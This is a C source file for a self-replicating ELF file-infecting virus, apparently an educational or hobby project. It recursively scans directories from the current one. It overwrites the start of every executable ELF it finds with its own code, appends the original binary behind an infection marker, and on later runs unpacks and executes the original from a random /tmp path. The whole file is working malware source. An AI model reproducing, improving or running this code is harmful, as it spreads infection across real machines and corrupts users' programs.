#include "readself.h"
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <dirent.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#include <ctype.h>
#include <sys/wait.h>

char randName[516] = {0};
char exePath[1024] = {0};
void *selfContent = NULL;
size_t selfSize = 0;
int infectedFlag = 0x12131415;
size_t sizeUpperBound = 16 * 1024;

int SearchForELFAndInfect(const char *path)
{
	DIR *dir;
	struct dirent *ent;
	if ((dir = opendir(path)) != NULL) {
		// opendir success
		// path is a valid directory
		while ((ent = readdir(dir)) != NULL) {
			if (strcmp(ent->d_name, ".") != 0 && strcmp(ent->d_name, "..") != 0) {
				size_t pathlength = strlen(path), dlength = strlen(ent->d_name);
				if (pathlength == 1 && path[0] == '/') {
					pathlength = 0;
				}
				char *newname = malloc(pathlength + dlength + 2);
				strcpy(newname, path);
				newname[pathlength] = '/';
				strcpy(newname + pathlength + 1, ent->d_name);
				newname[pathlength + dlength + 2] = '\0';
				if (!SearchForELFAndInfect(newname)) {
					if (!strcmp(ent->d_name, "virus")) {
						goto do_nothing;
					}
					// entry is not a directory.
					struct stat fileStatus;
					stat(newname, &fileStatus);
					if ((fileStatus.st_mode & (S_IXUSR | S_IXGRP | S_IXOTH))) {
						// the file `newname` is executable
						void *fileContent = malloc(fileStatus.st_size);
						FILE *fp = fopen(newname, "rb");
						fread(fileContent, 1, fileStatus.st_size, fp);
						fclose(fp);
						
						if (*(char *)fileContent == 0x7f
							&& *(char *)(fileContent + 1) == 0x45
							&& *(char *)(fileContent + 2) == 0x4c
							&& *(char *)(fileContent + 3) == 0x46) {
							printf("Found a ELF: %s\n", newname);
							printf("\t Try to infect.\n");		
						} else {
							goto do_nothing;
						}
						
						if (fileStatus.st_size < sizeUpperBound) {
							goto do_infect;
						}
						if (*(int *)(fileContent + sizeUpperBound) == infectedFlag) {
							goto do_nothing;
						}
					do_infect:
						fp = fopen(newname, "wb");
						fwrite(selfContent, 1, (selfSize > sizeUpperBound) ? (sizeUpperBound) : selfSize, fp);
						fseek(fp, sizeUpperBound, SEEK_SET);
						fwrite(&infectedFlag, 4, 1, fp);
						fwrite(fileContent, 1, fileStatus.st_size, fp);
						fclose(fp);
					do_nothing:;
					}
				}
				free(newname);
			}
		}
		closedir(dir);
		return 1;
	} else {
		// not a directory
		return 0;
	}
}


void RandName(char *buffer, size_t len)
{
	for (int i = 0; i < len; ++i) {
		int tmp = rand() % (10 + 26 + 26);
		if (tmp < 10) {
			buffer[i] = '0' + tmp;
		} else if (tmp - 10 < 26) {
			buffer[i] = 'A' + (tmp - 10);
		} else {
			buffer[i] = 'a' + (tmp - 10 - 26);
		}
	}
	buffer[len] = '\0';
}

int main(int argc, char *argv[], char *envp[])
{
	puts("virus start up");
	
	srand((unsigned)time(NULL));
	GetSelf();
	selfSize = GetSelfSize();
	selfContent = malloc(selfSize);
	ReadSelf(selfContent);
	
	pid_t infectPid;
	
	if ((infectPid = fork())) {
		// main process
		// to run the origin ELF
		printf("infect pid = %d\n", infectPid);
		if (selfSize > sizeUpperBound) {
			// begin to unpack original ELF
			puts("infected ELF run");
			size_t newNameLen = 0;
			while (newNameLen == 0) {
				newNameLen = rand() % 16;
			}
			RandName(randName, newNameLen);
			
			sprintf(exePath, "/tmp/%s", randName);
			
			FILE *originExe = fopen(exePath, "wb");
			fwrite(selfContent + sizeUpperBound + 4, 1, selfSize - sizeUpperBound, originExe);
			fclose(originExe);
			
			printf("origin exe unpack at: %s\n", exePath);
			chmod(exePath, 0777);
			execve(exePath, argv, envp);
			exit(0);
			int pipefds[2];
			static char bufferRead[4096];
			static char bufferWrite[4096];
			pipe(pipefds);
			pid_t pid;
			if (pid = fork()) {
				int returnStatus;
				while (!waitpid(pid, &returnStatus, WNOHANG)) {
					int count = read(STDIN_FILENO, bufferRead, sizeof(bufferRead));
					write(pipefds[1], bufferRead, count);
					count = read(pipefds[0], bufferWrite, sizeof(bufferWrite));
					write(STDOUT_FILENO, bufferWrite, count);
				}

			} else {
				perror("start up origin exe\n");
				dup2(pipefds[0], STDIN_FILENO);
				dup2(pipefds[1], STDOUT_FILENO);
				execve(exePath, argv, envp);
			}
		}
	} else {
		freopen("infect.log", "w", stdout);
		SearchForELFAndInfect(".");
	}
	return 0;
}

